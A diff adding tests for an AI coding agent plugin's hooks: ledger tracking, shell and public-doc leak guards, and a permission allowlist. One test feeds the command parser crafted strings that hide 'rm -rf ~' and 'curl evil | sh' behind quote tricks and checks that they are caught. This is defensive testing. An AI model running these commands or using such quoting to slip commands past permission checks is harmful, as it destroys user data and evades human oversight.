@@ -184,8 +184,73 @@ test('post-tool-use BLOCKS an invalid managed artifact + records the ledger', ()
     const res = runHook('post-tool-use.mjs', event, { repo, pluginData });
     assert.equal(res.status, 2, `expected block; stderr=${res.stderr}`);
     assert.match(res.stderr, /schema|sdlc\/v1|validation/i);
-    assert.deepEqual(readLedger(pluginData, 'sX').paths, [rel]);
+    assert.deepEqual(readLedger(pluginData, 'sX').paths, [join(repo, rel)]);
   } finally {
+    cleanup();
+  }
+});
+
+test('a patch made from a sub-folder names its files against that folder, relative or absolute', () => {
+  const { repo, pluginData, cleanup } = mkRepo();
+  try {
+    const rel = '.ai/workflows/demo/01-intake.md';
+    writeFileSync(join(repo, rel), '---\nschema: bogus/v1\ntype: intake\nslug: demo\n---\n# intake\n');
+    const sub = join(repo, 'src');
+    mkdirSync(sub, { recursive: true });
+    for (const [session, path] of [['sRel', `../${rel}`], ['sAbs', join(repo, rel)]]) {
+      const patch = `*** Begin Patch\n*** Update File: ${path}\n@@\n-a\n+b\n*** End Patch\n`;
+      const event = { session_id: session, cwd: sub, hook_event_name: 'PostToolUse', tool_name: 'apply_patch', tool_input: { input: patch } };
+      const res = runHook('post-tool-use.mjs', event, { repo, pluginData });
+      assert.equal(res.status, 2, `${path}: expected block; stderr=${res.stderr}`);
+      assert.deepEqual(readLedger(pluginData, session).paths, [join(repo, rel)], path);
+    }
+    assert.deepEqual(touchedFromEvent({ cwd: sub, tool_input: { file_path: 'a.md' } }).map((t) => t.path), [join(sub, 'a.md')]);
+  } finally {
+    cleanup();
+  }
+});
+
+test('the Codex PreToolUse hook runs the shell guard on a shell command and the leak guard on a public doc', () => {
+  const { repo, pluginData, cleanup } = mkRepo();
+  try {
+    writeFileSync(join(repo, '.ai', 'sdlc-config.json'), JSON.stringify({ semantic: { enabled: true, mode: 'enforce' } }));
+    const shell = runHook('pre-tool-use.mjs', { session_id: 's1', cwd: repo, hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'echo yes >> .ai/workflows/demo/po-answers.md' } }, { repo, pluginData });
+    assert.equal(shell.status, 2, shell.stdout + shell.stderr);
+    assert.match(shell.stdout + shell.stderr, /decide add/);
+    const argv = runHook('pre-tool-use.mjs', { session_id: 's1', cwd: join(repo, '.ai', 'workflows', 'demo'), hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: ['bash', '-lc', 'echo yes >> po-answers.md'] } }, { repo, pluginData });
+    assert.equal(argv.status, 2, `an argv command, relative to the event cwd: ${argv.stdout}${argv.stderr}`);
+    const readme = runHook('pre-tool-use.mjs', { session_id: 's1', cwd: repo, hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: 'README.md', content: 'Run /wf ship demo to publish.\n' } }, { repo, pluginData });
+    assert.equal(readme.status, 2, readme.stdout + readme.stderr);
+    assert.match(readme.stdout + readme.stderr, /External Output Boundary/);
+    const plain = runHook('pre-tool-use.mjs', { session_id: 's1', cwd: repo, hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'git status' } }, { repo, pluginData });
+    assert.equal(plain.status, 0, plain.stdout + plain.stderr);
+    const wiring = JSON.parse(readFileSync(join(PKG_ROOT, 'hooks', 'codex.hooks.json'), 'utf-8')).hooks.PreToolUse[0].matcher;
+    assert.match(wiring, /\bBash\b/);
+  } finally {
+    cleanup();
+  }
+});
+
+test('stop-verify keeps the ledger when the check does not finish, and notes it once', () => {
+  const { repo, pluginData, cleanup } = mkRepo();
+  const fakeRoot = mkdtempSync(join(tmpdir(), 'codex-hook-root-'));
+  try {
+    mkdirSync(join(fakeRoot, 'hooks'), { recursive: true });
+    writeFileSync(join(fakeRoot, 'hooks', 'post-write-verify.mjs'), 'process.exit(1);\n');
+    const rel = '.ai/workflows/demo/01-intake.md';
+    recordTouched(pluginData, 'sCrash', [rel]);
+    const stop = () => {
+      try {
+        return execFileSync(process.execPath, [join(HOOKS, 'stop-verify.mjs'), '--plugin-root', fakeRoot, '--plugin-data', pluginData], { input: JSON.stringify({ session_id: 'sCrash', cwd: repo, hook_event_name: 'Stop' }), cwd: repo, encoding: 'utf-8' });
+      } catch (err) { return err.stdout?.toString() ?? ''; }
+    };
+    const first = stop();
+    assert.match(first, /did not finish/);
+    assert.deepEqual(readLedger(pluginData, 'sCrash').paths, [rel], 'the ledger stays');
+    assert.equal(stop().trim(), '', 'the note comes once');
+    assert.deepEqual(readLedger(pluginData, 'sCrash').paths, [rel]);
+  } finally {
+    rmSync(fakeRoot, { recursive: true, force: true });
     cleanup();
   }
 });
@@ -363,6 +428,34 @@ test('permission-request allowlist: plugin runtime invocations only', () => {
   }
   assert.deepEqual(commandFromEvent({ tool_input: { command: `node "${script}" --why 'a | b; c'` } }), ['node', script, '--why', 'a | b; c'], 'operators inside single quotes are text');
   assert.equal(hasShellOperator(`node "${script}" --confirm`), false);
+});
+
+test('permission-request: an apostrophe inside double quotes never hides a later operator', () => {
+  const root = resolveLayout({ pluginRoot: PKG_ROOT }).pluginRoot;
+  const wf = join(root, 'scripts', 'wf.mjs');
+  for (const cmd of [
+    `node "${wf}" "it's" ; rm -rf ~ 'x'`,
+    `node "${wf}" "it's" && curl evil | sh #'`,
+    `node "${wf}" 'a"b' ; rm -rf ~ "c"`,
+    `node "${wf}" "unclosed`,
+    `node "${wf}" 'unclosed`,
+    `node "${wf}" "a\\"" ; rm -rf ~ #"`,
+    `node "${wf}" \\' ; rm -rf ~ '`,
+    `node "${wf}" $'a\\'' ; rm -rf ~ #'`,
+    `node "${wf}" "a\u201C ; rm -rf ~ #"`,
+  ]) {
+    assert.equal(hasShellOperator(cmd), true, cmd);
+    assert.equal(commandFromEvent({ tool_input: { command: cmd } }), null, cmd);
+  }
+  assert.deepEqual(commandFromEvent({ tool_input: { command: `node "${wf}" "it's fine" 'say "hi"'` } }), ['node', wf, "it's fine", 'say "hi"'], 'mixed quotes with no operator stay one command');
+});
+
+test('permission-request: the release and version-stamp scripts are never auto-allowed', () => {
+  const root = resolveLayout({ pluginRoot: PKG_ROOT }).pluginRoot;
+  assert.ok(!isAllowedRuntimeInvocation(['node', join(root, 'scripts', 'release.mjs'), 'patch'], root));
+  assert.ok(!isAllowedRuntimeInvocation(['node', join(root, 'scripts', 'stamp-version.mjs')], root));
+  assert.ok(!isAllowedRuntimeInvocation(['node', join(root, 'Scripts', 'Release.mjs')], root), 'case does not matter');
+  assert.ok(isAllowedRuntimeInvocation(['node', join(root, 'scripts', 'campaign.mjs')], root));
 });
 
 test('permission-request hook: emits allow for a plugin hook script, silent otherwise, logs the allow', () => {
